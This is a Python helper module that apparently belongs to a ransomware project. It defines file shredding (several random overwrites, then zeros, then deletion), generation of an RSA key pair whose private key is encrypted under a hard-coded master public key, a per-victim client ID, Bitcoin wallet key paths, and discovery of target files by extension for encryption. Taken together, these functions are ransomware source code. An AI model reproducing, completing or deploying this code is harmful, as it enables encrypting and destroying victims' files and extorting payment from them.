import logging
import hashlib
import uuid
from random import randint
from os import urandom, remove, path, listdir
from core.crypto.asymmetric_encryption import RSA, ECC
from .config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    MASTER_PUBLIC_KEY,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
    REQUIRED_FILE_FORMAT,
    CLIENT_ID_LOCATION
)
from pickle import load, dump, HIGHEST_PROTOCOL

logger = logging.getLogger(__name__)

def write_data_to_file(file_path, data, serialized=True):
    logger.info(f"Writing data to {file_path}")
    file = open(file_path, "wb")
    if serialized:
        file.write(data)
    else:
        dump(data, file, HIGHEST_PROTOCOL)
    file.close()


def read_data_from_file(file_path, serialized=True):
    logger.info(f"Reading data from {file_path}")
    file = open(file_path, "rb")
    if serialized:
        file_data = file.read()
    else:
        file_data = load(file)
    file.close()
    return file_data


def shred_file(file_path):
    logger.info(f"Shredding file {file_path}")
    with open(file_path, "ab+") as file_to_be_deleted:
        length = file_to_be_deleted.tell()

    with open(file_path, "br+") as file_to_be_deleted:
        for _ in range(randint(3, 11)):
            file_to_be_deleted.seek(0)
            file_to_be_deleted.write(urandom(length))

    with open(file_path, "br+") as file_to_be_deleted:
        for x in range(length):
            file_to_be_deleted.write(b"\x00")

    remove(file_path)


def generate_rsa_key_pair():
    logger.info("Generating RSA key pair")
    cipher = RSA()
    serialized_private_key = cipher.private_key
    serialized_public_key = cipher.public_key

    logger.info("Encrypting RSA private key")
    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)

    logger.info("Storing encrypted RSA private key in disk")
    write_data_to_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, encrypted_private_key, False
    )

    return serialized_public_key

def get_client_id():
    if path.exists(CLIENT_ID_LOCATION):
        client_id = read_data_from_file(CLIENT_ID_LOCATION).decode()
    else:
        client_id = str(uuid.uuid4())
        write_data_to_file(CLIENT_ID_LOCATION, client_id.encode())
    return client_id

def get_files_to_be_encrypted(directory):
    logger.info(f"Discovering files in {directory}")
    files_to_encrypted = [
        f"{directory}/{file}"
        for file in listdir(directory)
        if path.splitext(f"{directory}/{file}")[1].upper() in REQUIRED_FILE_FORMAT
    ]
    return files_to_encrypted

